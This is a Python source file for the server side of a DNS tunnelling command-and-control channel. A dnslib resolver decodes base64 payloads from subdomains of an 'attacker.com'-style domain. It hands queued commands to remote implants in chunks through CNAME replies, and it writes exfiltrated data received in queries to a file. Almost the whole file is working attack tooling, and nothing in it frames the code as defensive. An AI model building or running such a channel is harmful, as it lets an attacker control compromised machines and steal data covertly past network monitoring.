
import queue 
import base64
from dnslib import CNAME
from dnslib.server import BaseResolver, QTYPE, RR 
from printer_message import PrinterMessage, PrinterMessageType
from enum import Enum
from collections import deque

def chunk_string(s: str, chunk_size: int) -> deque[str]: 
    d = deque()
    for i in range(0, len(s), chunk_size): 
        d.append(s[i:i+chunk_size])
    return d


class TunnelMessageType(Enum): 
    PROBE = "P"
    ACK = "A"
    FILE_START = "FS"
    FILE_END = "FE"
    CONN = "C"

class ResolverState(Enum): 
    FILE_START = 1
    FILE_SENDING = 2

class TunnelResolver(BaseResolver):
    def __init__(self, command_queue: queue.Queue, print_queue: queue.Queue, response_file_path: str, domain: str, chunk_size: int): 
        self.command_queue = command_queue
        self.print_queue = print_queue
        self.response_file_path = response_file_path
        self.domain = domain
        self.state = ResolverState.FILE_START
        self.chunked_response = deque()
        self.last_command = ""
        self.chunk_size = chunk_size

        super().__init__()

    def resolve(self, request, handler):
        reply = request.reply()

        qname = request.q.qname
        labels = str(qname).rstrip(".").split(".")

        # Expect: <payload>.attacker.com
        try:
            payload = labels[0]

            decoded = base64.urlsafe_b64decode(payload + "==").decode()

            response_text = TunnelMessageType.ACK.value

            # Send command if one exists on PROBE message 
            match decoded: 
                case TunnelMessageType.CONN.value: 
                    self.print_queue.put(PrinterMessage(message_type=PrinterMessageType.CONN))

                case TunnelMessageType.PROBE.value: 

                    starting_state = self.state

                    if starting_state == ResolverState.FILE_START: 
                        # Transition only if there is a command to send. Otherwise, send ACK 
                        if not self.chunked_response:  
                            try: 
                                self.last_command = self.command_queue.get_nowait()
                                self.chunked_response = chunk_string(self.last_command, self.chunk_size)
                                self.state = ResolverState.FILE_SENDING
                                response_text = TunnelMessageType.FILE_START.value
                            except queue.Empty: 
                                pass 

                    elif starting_state == ResolverState.FILE_SENDING: 
                        # Send next chunk if there is a chunk to send
                        # Otherwise, transition back to start state and send FILE_END
                        if self.chunked_response: 
                            response_text = self.chunked_response.popleft()
                        else: 
                            self.print_queue.put(PrinterMessage(message=self.last_command, message_type=PrinterMessageType.SENT))
                            response_text = TunnelMessageType.FILE_END.value
                            self.state = ResolverState.FILE_START




                case TunnelMessageType.FILE_START.value: 
                    self.print_queue.put(PrinterMessage(message=decoded, message_type=PrinterMessageType.FILE_START))
                case TunnelMessageType.FILE_END.value: 
                    self.print_queue.put(PrinterMessage(message=decoded, message_type=PrinterMessageType.FILE_END))
                case _: 
                    self.print_queue.put(PrinterMessage(message=decoded, message_type=PrinterMessageType.RECEIVED))
                    with open(self.response_file_path, "a") as f: 
                        f.write(decoded)

            encoded_resp = base64.urlsafe_b64encode(
                response_text.encode()
            ).decode().strip("=")

            resp_qname = f"{encoded_resp}.{self.domain}"

            reply.add_answer(
                RR(
                    qname,
                    QTYPE.CNAME,
                    rdata=CNAME(resp_qname)
                )
            )

        except Exception as e:
            self.print_queue.put(PrinterMessage(message=str(e), message_type=PrinterMessageType.ERROR))

        return reply






